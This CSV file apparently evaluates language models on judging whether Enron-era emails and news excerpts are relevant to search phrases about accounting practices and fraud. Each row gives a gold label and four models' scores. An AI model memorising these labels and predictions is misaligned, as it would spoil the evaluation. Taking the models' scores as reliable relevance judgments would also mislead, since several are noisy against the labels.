search_phrase,label,email,mistral_pred,openhermes_pred,vicuna_pred,gemma_pred
RANDOM,0,"Subject: Duke Energy Field Services 4/01

For once his is not a Panenergy question.  For sale deal 707274, DEFS says the price on 4/4 should be 5.25 and we have 5.20 in Sitara.  Can you confirm this price for me?

Megan",0.0,0.0,0.8,0.0
RANDOM,0,"Subject: RE: FYI...

No, I'm working on the credit agreement.

 -----Original Message-----
Subject:	RE: FYI...

Yes, Amelia sent us a note early this morning.   Are you coming to it?

Morris A. Brassfield
Enron Transportation Services
Senior Director
Operations Support Services
Three Allen Center 3285
333 Clay Street
Houston, Texas 77002


 -----Original Message-----
Subject:	FW: FYI...

Are you aware of this?

 -----Original Message-----
Subject:	FYI...

Stan's meeting with Phil's group is at 2:00 today in 2AC12 - Forum.",0.0,0.0,0.5,0.6
RANDOM,0," investigation by the Securities and Exchange Commission (SEC).
       Network equipment maker Enterasys Networks, another firm under investigation by the SEC, saw its share price plunge 60 percent as analysts downgraded its stock after the company warned of disappointing quarterly revenues. After Friday's close, Enterasys said it had discovered accounting irregularities in its Asian operations. 
       Monday's earnings news failed to calm investors. Shares of computer and printer maker Hewlett-Packard pared early gains and was flat after the firm said its earnings in the quarter ended Jan. 31 will substantially exceed Wall Street's forecast. Shares Compaq Computer, which has proposed to merge with Hewlett-Packard but faces shareholder opposition, also slipped.
       In other earnings news, home improvement retailer Lowe's said its fourth-quarter earnings would top an earlier forecast. And Internet commerce firm Priceline.com reported a fourth-quarter profit versus a year-ago loss. Priceline's shares slid 21 percent.
       Also, Elan's stock price slumped 52 percent after the Irish pharmaceutical company warned that 2002 financial results will fall short of expectations. Its shares came under pressure last week on concerns about the firm's accounting practices. 
       On the Dow, financial issues like J.P. Morgan Chase, Citigroup and American Express fell sharply, reflecting investors' doubts about the timing of an economic recovery. General Electric, a Dow stock with a complicated accounting structure, saw its share price fall 5 percent on concerns its accounting practices might not be up to par.
       Also Monday, President Bush sent Congress a $2.13 trillion budget Monday that provides billions of dollars in new spending for the war on terrorism and homeland security.
       And telecom shares slid after a handful of companies reported bad news. Shares of Williams Communications Group fell 29 percent after its banks warned that it may be in default under its credit agreement. And concerns about WorldCom's debt ratings sent its shares price down 16 percent.
       Fourth-quarter earnings season, which has been the worst in over a decade, moves into lower gear this week. A few big-name firms are slated to report their earnings scorecards, including Web gear maker Cisco Systems.
       Stocks finished Friday with modest losses, as cautious investors took profits from a strong two-day advance on Wednesday and Thursday amid concerns about the timing and",0.0,0.0,0.8,0.2
mark to market accounting practices,1,"'Bright Lines' ""If you try to build a system or a process that eliminates judgment to= the maximum extent, the auditor can go to the client and point at the rule= and say, 'This is what you can do,''' said Michael Sutton, who was the SEC='s chief accountant between 1995 and 1998. ""It's inevitable you are going t=o have these financial engineers that find ways to work around those rules.='' The 3 percent rule highlights a broader debate in accounting between a=dvocates of ""principles-based'' rules that require auditors to look at the =economic substance of a transaction and those who argue for ""bright lines''= that clearly define what a company can and cannot do. Adopting a more principles-based approach will be difficult because wi=thout specific rules ""companies are going to say, 'Where does it say I can'=t do it?'' said Jim Harrington, head of accounting and SEC technical servic=es for PricewaterhouseCoopers LLC, the biggest accounting firm. Still, he s=aid he thinks accounting should shift in that direction because ""it does aw=ay with the financial engineering.'' Outside the United States, accounting standards focus on determining w=ho is in control and provide a series of tests that auditors can use. ""There are indicators, but the concept is control,'' said Mary Barth, =an accounting professor at Stanford University and a member of the Internat=ional Accounting Standards Board. ""It's a philosophical difference. The U.S=. has seemed more comfortable with bright line rules, but the international= standards have much less of that. It all comes down to judgment.'''Forest for the Trees' Under IASB rules, even majority ownership wouldn't necessarily require= the entity be included on the balance sheet if, for example, someone else =owned convertible bonds or another security that could become equity owners=hip. ""When you write these really detailed rules, sometimes you lose the fo=rest for the trees,'' said Robert Herz, a partner at PricewaterhouseCoopers= who also is on the International Accounting Standards Board. ``In IAS rule=s, you look more at substance than form. There's no 3 percent rule and in f=act the presumption is the opposite. If the special purpose entity is thinl=y capitalized, you'd presume it should be consolidated.'' FASB officials said their goal is to approve the first revisions of ru=les on SPEs by the end of the year.FASB Priorities",0.0,0.0,0.8,0.2
RANDOM,0,"Subject: Community Relations Council Mtg.

Set up by Vanessa Bob/for Cindy Olsen
RSVP to Missy Stevens/35115",0.0,0.0,0.0,0.0
mark to market accounting practices,0,"Subject: P&L associated with Avista transaction to cover NW book of business (Jan 13-19)Third Week  Gross Revenue  Expense  Net P&L   96 72   23 20    Point Buy/Sale Counterparty On Off Price Deal # On Hours Off hours On Hours Off hours   On Off Total MC S CRC -25 150 508906 0 1800 $ -  $ 270,000  $ -  $ 36,000  $ -  $234,000   MC S BPA -25 75 658386 2400 0 $ 180,000  $ -  $ 55,200  $ -  $ 124,800  $ -   MC S BPA -50 -50 73 600522 4800 3600 $ 350,400  $ 262,800  $ 110,400  $ 72,000  $ 240,000  $190,800   MC S BPA -50 -50 72 600521 4800 3600 $ 345,600  $ 259,200  $ 110,400  $ 72,000  $ 235,200  $187,200   MC S GRAYS -10 64 715879 960 0 $ 61,440  $ -  $ 22,080  $ -  $ 39,360  $ -   MC S BPA -14 47.5 664061 1344 0 $ 63,840  $ -  $ 30,912  $ -  $ 32,928  $ -   MC S BPA -13 47.5 664061 0 936 $ -  $ 44,460  $ -  $ 18,720  $ -  $ 25,740   MC S BPA -50 -6 42.9 448835 4800 432 $ 205,920  $ 18,533  $ 110,400  $ 8,640  $ 95,520  $ 9,893   MC S BPA -6 42.75 447576 576 0 $ 24,624  $ -  $ 13,248  $ -  $ 11,376  $ -     0 0 $ -   $ -   $ -   19680 10368 $ 1,231,824  $ 854,993  $ 452,640  $207,360  $ 779,184  $647,633  $1,426,817 Total -205 -144",0.0,0.0,0.8,0.8
it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"When energy trader Enron Corp. admitted to hiding billions of dollars of li=abilities in mysterious off-book entities, it trotted out the lame excuse o=f scoundrels: Everyone does it. And this time, it was the gospel truth.=20Hundreds of respected U.S. companies are ferreting away trillions of dollar=s in debt in off-balance-sheet subsidiaries, partnerships, and assorted obl=igations, including leases, pension plans, and take-or-pay contracts with s=uppliers. Potentially bankrupting contracts are mentioned vaguely in footno=tes to company accounts, at best. The goal is to skirt the rules of consoli=dation, the bedrock of the American financial reporting system and the sour=ce of much its credibility. These rules, set clear in 1959, aim to make pub=lic companies give a full and fair picture of their business--including all= the assets and liabilities of any subsidiaries. But accountants, lawyers, =and bankers have learned to drive a coach and horses through them.Because of a gaping loophole in accounting practice, companies create arcan=e legal structures, often called special-purpose entities (SPEs). Then, the= parent can bankroll up to 97% of the initial investment in an SPE without =having to consolidate it into its own accounts. Normally, once a company ow=ns 50% or more of another, it must consolidate it under the 1959 rules. The= controversial exception that outsiders need invest only 3% of an SPE's cap=ital for it to be independent and off the balance sheet came about through =fumbles by the Securities & Exchange Commission and the Financial Accountin=g Standards Board. In 1990, accounting firms asked the SEC to endorse the 3=% rule that had become a common, though unofficial, practice in the '80s. T=he SEC didn't like the idea, but it didn't stomp on it, either. It asked th=e FASB to set tighter rules to force consolidation of entities that were ef=fectively controlled by companies. FASB drafted two overhauls of the rules =but never finished the job, and the SEC is still waiting.=20It's not just the energy industry that exploits the loophole and stashes ma=jor liabilities in the never-never land of SPEs. Increasingly, companies of= all stripes routinely use them to offload potential balance-sheet bombshel=ls such as loan guarantees or the financing of sales of their own products.= For example, the accounts of data processor Electronic Data Systems Corp. =don't show $500 million--half of last year's earnings--that it would owe if= its customers were to cancel their contracts and leave it holding the bag =for loans on their computer equipment. The arrangement is acknowledged only= in a footnote. An EDS spokesman says the tactic is common in the industry =and does not put the company at undue risk.=20Airlines keep appearances aloft by shunting billions worth of airplane fina=ncing into off-balance-sheet vehicles, says credit analyst Philip Baggaley =",0.8,0.5,0.9,0.8
mark to market losses,0,"Subject: Trader, Thursday S&P -9.63 USD +0.14 DOW -85.31 NAS -64.35 CRB +0.48T H U R S D A Y E V E N I N G E X T R E M E M A R K E T SA complimentary service from INO.com ( http://www.ino.com/ )Thursday: The CRB Index has advanced 0.48 points to 190.15. The US Dollar Index rose 0.14 points to 115.59.The Dow Industrials moved down 85.31 points, at 9985.18, while the S&P 500 fell 9.63 points, last seen at 1139.93. The Nasdaq Composite trended lower by 64.35 points to 1918.54._____________________________________________________________________*FREE TRADING KIT-- CD, Video, or Audiocassette Specifically designed for futures & option traders._____________________________________________________________________TIME, PRICE and PATTERN (video, book AND alerts!)_____________________________________________________________________FORECAST THE FUTURE,PROJECT HIGHS & LOWS ANDDISCOVER HOW THE 1,2,3 METHOD REALLY WORKS! Dear Trader: Introducing TIME, PRICE and PATTERN from trading war room veteran John Crane.All-new 90-minute video and book offer shows you how to:>> Pinpoint market entry and exit signals >> Rely on internal market forces - not guesswork >> Learn to overcome the 7 biggest mistakes traders make. This incredible new method is nothing short of amazing. It combines price levels, market timing and confirmation patterns to strengthen the predictability of market moves - and your bottom line! It is simple to implement, yet accurate enough to pinpoint exact timing signals. Best of all, this technique does not require large investment capital.Order your special edition copy today and get . . .>> EXCLUSIVE 90 MINUTE VIDEO - Time, Price and Pattern >> COMPLETE BOOK - The Reversal Day Phenomenon >> FREE NEWSLETTER - 3-Month Subscription to 'The Reversal Day'>> FREE SUPPORT - Talk to a live person or go online! AVAILABILITY LIMITED - Order Today!All claims on third-party products are made by the publisherand not by INO.com. All Products Guaranteed._____________________________________________________________________E X T R E M E M A R K E T C O M M E N T A R Y_____________________________________________________________________The STOCK INDEXES http://quotes.ino.com/exchanges/?c=indexes",0.0,0.0,0.7,0.6
RANDOM,0,"provals, 3-20-01 _ GCP (US) Response

Any updates on adding the correct legal name to this counterparty name?

---------------------- Forwarded by Samuel Schott/HOU/ECT on 03/28/2001 12:53 
PM ---------------------------
   
	
	
	

Moran/Enron@EnronXGate, Lisa Lees/HOU/ECT@ECT, Marilyn Colbert/HOU/ECT@ECT 
Subject: Re: EOL approvals, 3-20-01 _ GCP (US) Response  

Hello,

Yes, GCP provides the links to establish the correlation between the parent 
and child for our downstream systems.
GCP procedure is to create Counterparty names that reflect either the 
Tradename / Division name or Parent Name  - - not both simultaneously.
(Although, we have broken that rule for Legal in the past.) This defeats the 
purpose of using a Tradename.

Best Rgds.

Samuel


   


     03/23/2001 10:21 AM	
	
	
	                           
	

Moran/Enron@EnronXGate, Lisa Lees/HOU/ECT@ECT 
Subject: Re: EOL approvals, 3-20-01 _ GCP (US) Response  

Tana,
 
Please review the process below:

With divisions,  EOL does request a new Password Application for the 
applicant reflecting the name as you noted below.  When the company is set up 
in the EOL database we link the company to the Parent and reference the CP 
ID.  Sam, please confirm, Global Counterparty also provides the links to 
establish correlation between the parent and child for our downstream systems.

Let me know if this is the appropriate steps that you would like to see.  

Thanks,
Stephanie    


Subject: Re: EOL approvals, 3-20-01 _ GCP (US) Response  

Sam & Stephanie,


It was my understanding with the EOL Team that all divisions would have the 
legal incorporated entity as part of the name.  Stephanie, I my preference is 
to kick their Password Application back and get them to change it to read 
something like ""Cargill Ferrous International, a division of Cargill, Inc.""  
or ""Cargill, Inc. acting through its Cargill Ferrous International Division"".



	Samuel Schott
	03/21/2001 01:58 PM
		
Jones/HOU/ECT@ECT, Mark Taylor/HOU/ECT@ECT, Brant 
Reves/ENRON@enronXgate@ENRON, Debbie R Brackett/HOU/ECT@ECT, David 
Hardy/LON/ECT@ECT, Lesli Campbell/ENRON@enronXgate@ENRON, Cynthia 
Clark/ENRON@enronXgate@ENRON, Enron Europe Global Contracts and 
Facilities@ENRON, Enron Europe Global CounterParty/LON/ECT@ECT, Stephanie 
Sever/HOU/ECT@ECT, Tom Moran/ENRON@enronXgate@ENRON, Claudia 
Clark/HOU/ECT@ECT, William S Bradford/ENRON@enronXgate@ENRON, Lisa 
Lees/HOU/ECT@ECT, Juana Fayett/Corp/Enron@Enron, Jana Morse/Corp/Enron@Enron, 
T",0.0,0.0,0.8,0.2
RANDOM,0,"negy Inc. (DYN, news, msgs); El Paso Energy Corp. (EPG, news, msgs
); Columbia Transmission Communications, a unit of Columbia Energy Group (CG, 
news, msgs); and Koch Industries. 
		Those companies all have one thing in common and it isn't ownership of 
telecommunications bandwidth. They all have years of experience trading 
energy commodities. 
		Last month companies from the energy side joined some carriers and others 
interested in standardized trading of bandwidth at a meeting put together by 
CompTel, a telecom industry trade association. 
		At that meeting they decided who would be considered principals in the 
bandwidth trading market - companies that will ""take title to,"" or own, 
bandwidth. In other words, principals will be either telecom carriers or 
companies that will buy and sell bandwidth to manage risk in the 
telecommunications industry. 
		They also formed a committee of principals to study standard terms and 
conditions needed to establish a liquid market for bandwidth trading. 
		People who attended the meeting said two of the largest carriers were missing 
at the CompTel meeting. MCI WorldCom (WCOM, news, msgs) was there but AT&T (T
, news, msgs) and Sprint (FON, news, msgs) weren't. 
		The meeting next week, which starts Monday, is for telecom carriers only, 
Epps said. This week, he wouldn't mention names of the companies invited, but 
last month he told Dow Jones Newswires his company's meeting would include 
""the real players, the MCI WorldComms, the Qwests (Q, news, msgs), the 
AT&Ts.... It's about people who have the assets and how we use these to 
advantage the marketplace, how we build a good powerful market model,"" Epps 
said. ",0.0,0.0,0.7,0.0
it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,0,"When prices are zero, suppliers take a hike -- that's what economicsteaches. But once the state government started pumping its own cash into themarket, the phony posted prices plummeted and supplies became plentifulagain. Now California is swimming in power and nobody talks about an ""energycrisis"" anymore.You can date the loss of investor confidence in Enron almost exactly to themoment when the California fiasco began to repair itself. Fortune Magazineput the inaugural nail in Enron's coffin in March, noting that the company'sgrowing dependence on trading had turned it into an oil-patch version ofGoldman Sachs. Goldman's stock sells at a price-earnings multiple of 17,reflecting investors' well-founded distrust of trading earnings to bereproduced reliably year after year. So why, the magazine asked, was Enronawarded a multiple of 60-plus? Mmm...Enron did yeoman service as a champion of deregulation. Boss Ken Lay, abeliever in technology and the power of markets, was a true visionary, tothe point of annoying people who didn't care for his air of being a man onthe right side of history. The moldering pipeline he took over wouldcertainly have been an also-ran if he had not thrown Enron headlong intotrading and marketing.But deregulation doesn't confer permanent advantage on anybody. Aderegulated environment favors constant innovation and a continual upsettingof plans and strategies.Add the fact that, despite the California bubble, there is no reason tobelieve energy prices won't continue their long-term relative decline astechnology advances more quickly than the depletion of conventionalresources. Add also the likelihood that information technology will continueto lower the barriers to entry to Enron's trading business, which means morecompetition and shrinking margins. Enron begins to look a lot like Phibro.The great commodity-trading machine was already running down by 1981, whenit bought Salomon and Wall Street was swooning. Inflation was being quelledby Paul Volcker. The products that Phibro traders bought and sold wereincreasingly being traded transparently on electronic exchanges. ""Four orfive years ago, they used to be able to take other companies to thecleaners, because they knew where the market was and others didn't,"" atrader explained. ""With everyone knowing, within a few cents, where theprice of any product was, Phibro's ability to make a profit off its superiorknowledge disappeared.""Not only is this true of Enron, but of its would-be bottom fisher, Dynegy,run by Mr. Lay's Houston homeboy, Chuck Watson. Dynegy's proposed takeoverof its former nemesis was hanging by a negotiation yesterday.",0.0,0.5,0.9,0.2
RANDOM,0,"Subject: RE: UT Man!

goin to the beach w/ pete

 -----Original Message-----
Subject:	UT Man!

Still interested.  Got Todd on the phone",0.0,0.0,0.0,0.0
mark to market losses,0,"Subject: Re: Message PointsThank you.Mark Palmer11/01/2000 03:42 PMHartsoe/Corp/Enron@Enron, Karen Denne/Corp/Enron@Enron, Mary Kaufman/PDX/ECT@ECT, Richard Shapiro/NA/Enron@Enron, Sandra Susan J Mara/SFO/EES@EES, Tim Belden/HOU/ECT@ECTI think we should shy away from the 300 MW message. It's getting in the way of the positive message, and the math turns out to be a bit ""Goreish."" (read: fuzzy) I found myself wandering down all sorts of blind alleys in my spin to Dow Jones. I say we generalize it more. Something to the effect of ""The price caps send the wrong message to the marketplace. Whether it's gas lines in the seventies or bread lines in the old Soviet Union, price caps and market intervention cause problems.""Mark",0.0,0.2,0.7,0.2
it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"1(k) accounts then worth about $1.6 billion. Enron created hidden str=uctures to inflate profit, enrich executives - lawyers Jan 22 - AFX Lawye=rs for Enron Corp shareholders and workers allege that Enron created comple=x, largely hidden financing structures to inflate its revenue and profit, h=ide debt from view, delay reporting losses and enrich some executives who r=an them, the Washington Post reported, citing confidential documents addres=sed to private investors in Sept 2000. Accounting Firms Are under Scr=utiny after Enron Case, Industry Experts Say By Megan Mulholland, The Pos=t-Crescent, Appleton, Wis., Jan. 22 The integrity of the accounting industr=y is in jeopardy after Enron's bankruptcy cast a shadow on the financial se=ctor, say local industry experts. Implications of Enron Debacle Terri=fy Financial Experts By Miriam Hill, The Philadelphia Inquirer, Jan. 22 S=hredded documents. Congressional investigations. Phone calls to the Preside=nt's men. Billions of dollars vanished. Financial - Ratings Centri=ca in focus after Schroders valuation-driven downgrade LONDON, Jan 22, 20=02 (AFX-Europe via COMTEX) -- Centrica PLC was under the spotlight in earl=y deals, pressurised by a downgrade by influential broker Schroder Salomon =Smith Barney, which feels the energy group is fully valued at current level=s, dealers said. Financial - Results PPL could take Brazil-related= charges in '01, '02 ALLENTOWN, Pa., Jan 22 (Reuters) - Leading power pro=ducer and distributor PPL Corp. said on Tuesday that the effect of energy r=ationing in Brazil could result in ""substantial"" charges to its 2001 and 20=02 earnings. Kansas City, Mo.-Based UtiliCorp United Expects Better E=arnings for 2001 By Steve Everly, The Kansas City Star, Mo., Jan. 22 Util=iCorp United Inc. said Monday that it expected earnings for the year to be =about 10 percent above 2000 levels. AEP fourth-quarter earnings fall =on weather, economy COLUMBUS, Ohio, Jan 22 (Reuters) Utility holding comp=any American Electric Power Co. Inc. said Tuesday its fourth-quarter earnin=gs fell 41 percent, blaming unusually mild weather and the weak economy. = PSEG fourth-quarter results fall on weather, economy NEWARK, N.J., Ja=n 22 (Reuters) Public Service Enterprise Group, owner of New Jersey's large=st gas and electric utility, said Tuesday fourth-quarter profits fell 6.7 p=ercent, citing mild weather and the slowing economy. Northeast swings= to profit in fourth quarter NEW YORK, Jan 22 (Reuters) - Northeast Utili=ties, New England's largest power distributor, on Tuesday posted a fourth-q=uarter profit, but results fell slightly short of Wall Street's consensus e=stimate as warmer-than-normal weather dampened demand. International = Belgian Energy Group to Shed Two Thai Plants By Srisamorn Phoosuphanus=",1.0,0.0,0.9,0.8
RANDOM,0,"Subject: Jennifer Stephenson, Edith Cross,Christy Albaugh.eb3127


	Jennifer Stephenson, Edith Cross,Christy Albaugh.eb3127


Chairperson:	Outlook Migration Team

Detailed Description:",0.0,0.0,0.7,0.8
mark to market losses,0,"Subject: Re: MarketShirley,I think it's a growing problem of junk mailthat is being sent indiscriminately to everybody.Sometimes it comes from legitimate institutions,sometimes it represents scams. I got a message todayabout diamonds in Sierra Leone.VinceShirley Crenshaw01/02/2001 08:16 AMSubject: MarketDo you know who this is? I have been getting this, but don't know why orwho he is.Does it sound reputable?---------------------- Forwarded by Shirley Crenshaw/HOU/ECT on 01/02/2001 12/29/2000 01:40:02 PMSubject: Market12/28/00The markets finally took a breather, as the light volume seemed to indicatethe tax loss season was mostly over, and investors were enjoying theirholidays and trying to forget a bad year for the markets. The week waspretty god, with perhaps some last minute tax selling on Friday. It will beinteresting to see how next week fares.I think tech will continue to suffer through the first half of the year. Theearnings are not likely to improve until sometime in the second half. Atthat point, year to year comparisons will be more favorable. There will besome successes, as so many have been beaten down too far. Energy looksstrong right now, but I would be cautious as we get past the winter and thegas price comes down to a more reasonable level.Merrill Lynch now predicts fed cuts of 100 basis points by the end of thesummer. These cuts will create a strong emotional push to the market, evenin the face of lower earnings. Merrill Lynch is also predicting a GDP growthof 2.9%, down from the previous forecast of 3.3%. This certainly wouldqualify as a ""rough"" if not ""hard"" landing. They expect the GDP growth inthe second half of 2001 to rise at a 3.5%-4% rate. They predict thestrongest earnings to come from Health and Energy at about 14%, with Techand Utilities at 10%.Some of the market weakness and economy concern could stem from thestatements being made by the new Bush administration. They want to be surethe public is aware of the slowing economy, so the issue will be seen as onethey inherited, not created. They don't want to be seen as the ones whomessed up the great boom. They also want justification for the tax cut planthey had proposed, and a weaker economy is certainly a good reason tostimulate the economy with cuts.",0.0,0.0,0.7,0.0
record keeping accounting practices,0,"Accounting rules should be based on the concept of risk andreward, requiring companies to list more of the assets andliabilities that are at risk on the balance sheet, Berardino wrotein a piece entitled ``Enron: A Wake-Up Call.'' Current rules havefostered a ``technical, legalistic mindset that is sometimes moreconcerned with form than with substance,'' Berardino said. Enron, whose auditor was Arthur Andersen, filed forbankruptcy protection after posting a third-quarter loss of $1.01billion in October. The Houston-based company used off-balance-sheet financing vehicles that enabled it to boost leverage withoutreporting to investors the increased debt on its balance sheet. The U.S. financial reporting model, which emphasizeshistorical information and a single earnings-per-share number, wascreated in the 1930s, when most assets were tangible and therewere no derivatives or off-balance-sheet financing. It needs to beupdated to take into account new complex financial structures andthe associated risks, Berardino said. Today, disclosures should becontinuous, not periodic, and include performance indicatorsbeyond earnings-per-share, Berardino said. Berardino also said that it takes too long to set newstandards because regulatory responsibilities are shared by toomany agencies. ``Responsibility for administering discipline istoo diffuse and punishment is not sufficiently certain to promoteconfidence in the profession,'' Berardino wrote.EDF Says It's in Talks to Buy Enron's European Retail Unit2001-12-04 09:01 (New York)EDF Says It's in Talks to Buy Enron's European Retail Unit Paris, Dec. 4 (Bloomberg) -- Electricite de France, Europe'slargest power company, said it is in negotiations to buy theEuropean retail energy business of Enron Corp., the U.S. energytrader that filed for bankruptcy protection. France's state-owned electricity company would gain 150,000gas and electricity customers, mainly in the U.K., with theacquisition of Enron Direct. It is talking toPricewaterhouseCoopers about a purchase, said a spokesman forElectricite de France, who declined to be named. ``Enron Direct would fit well with our London Electricitybusiness,'' Gerard Wolf, director of the chairman's office for theFrench company, told Reuters earlier. Enron, the biggest energy trader, is trying to survivehistory's biggest Chapter 11 reorganization. It's lining up a $1.5billion loan, getting permission to spend money to keep operatingand firing 4,000 workers. Centrica Plc and Innogy Holdings Plc of the U.K, TXU Corp.and RWE AG, Germany's No. 2 utility, are also interested in buyingEnron Direct, said Reuters, without citing a source.--Brooke Nelson in the Madrid newsroom (34 91) 700-9602, orEnron Lines Up $1.5 Billion in Bankruptcy Financing (Update5)2001-12-03 21:02 (New York)Enron Lines Up $1.5 Billion in Bankruptcy Financing (Update5)",0.0,0.0,0.0,0.0
RANDOM,0,"Subject: <<Concur Expense Document>> - SK092501

The Payment status has changed on the following report:

Status last changed by:  System
Amount Approved: $6,254.01
Amount Paid: $0.00
Approval Status: Approved
Payment Status: Processed


To review this expense report, click on the following link for Concur Expense.",0.0,0.0,0.8,0.2
it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,0,"Enron employee lawsuit stands a chance of recovering some percentage of th=e retirement fund loss, even if not a penny comes from Kenneth Lay's $145 m=illion.",0.0,0.0,0.0,0.0
mark to market accounting practices,0,"Why do we need to standardised controls?To assimilate new or build existing commodity businesses Enron needs to be nimble and responsive. A robust and stable control process can be duplicated or flexed quickly and confidently, providing scalability and the capability to assess and manage operational risk.How do we measure successful control?By identifying and reporting metrics for all standards we build an understanding of compliance across all businesses and seek continual improvement. This compliments the qualitative cross-checking process facilitated by communication between Commercial, Risk Management Operations and RAC.The control measurement process will be part of a global initiative across all commodities and locations.Where can you find details of our fundamental standards?Mike Jordan - Head of Risk Management Operations for Enron EuropeFernley Dyson - Chief Accounting Officer for Enron Europe",0.0,0.0,0.7,0.0
mark to market losses,0,"Upside to Q; Outlook Bullish; Wish Stock Were Cheaper (C)OLD NEW STREET P/EPrice: $54.52 EPS 2000 N/A $0.00 N/A N/A52 Wk Ra: $62 - 25 EPS 2001 $0.84E $0.89E $0.68E 61.3Mkt Cap: $7.6B EPS 2002 N/A $1.71E $1.74E 31.9FY: 3/31 Price Target N/A N/ARank 3 3*There is no doubt in our minds that ERTS is one of the premier publishersin the industry. The co's solid performance in a difficult Qmakes it easy to believe that when hurdles are absent (i.e. an abundance ofgame consoles) they can outperform. That said, we wishthe stock were not so pricey. Due to valuation, we reiterate our marketperform.*1Q01 operating EPS of $(0.09) vs $0.08 were better than our $(0.15) est.Most of the upside came from EA Core, where in line revswere bolstered by lower op. exp. At EA.com, slightly higher revs were offsetby lower margins.*We are raising our consol. FY02E to $0.89 from $0.84 and are initiatingquarterly EPS of $(0.13), $(0.05), $0.87 and $0.20. We arealso initiating a consol. FY03E EPS of $1.71.*Adjusting for EA.com, ERTS currently trades at a forward P/E of 35.3x -higher than hist averages. Though ERTS is on the cusp ofsolid growth, this valuation indicates that it is currently in the stock.IDEC: Response on Zevalin to the FDA by mid-July. (A,C)OLD NEW STREET P/EPrice: $54.19 EPS 2000 N/A $0.30 N/A N/A52 Wk Ra: $78 - 19 EPS 2001 $0.52E $0.52E $0.55E 104.2Mkt Cap: $6.9B EPS 2002 $0.67E $0.67E $0.84E 80.9FY: 12/31 Price Target $49 $49Rank 2 2*IDEC expects to answer the FDA's questions on Zevalin by mid-July. Ourassumption for launch in 1Q02 remains intact.*The FDA has issued a Complete Review Letter on Zevalin, asking IDEC toaddress a number of clinical and CMC issues.*The FDA is not requiring additional Phase III trials or further imaging onpatients for the BLA submission.*The timing for Zevalin at the FDA remains a question. There are currentlyno completion requirements for the FDA, although we areclearly encouraged by IDEC's ability to respond quickly.*We continue to expect launch in 1Q02. We maintain our sales projections forZevalin in 2002 and 2003 at $70.9 million and $119.8million, respectively.David C. MorrisSr. VP Lehman Brothers",0.0,0.0,0.8,0.2
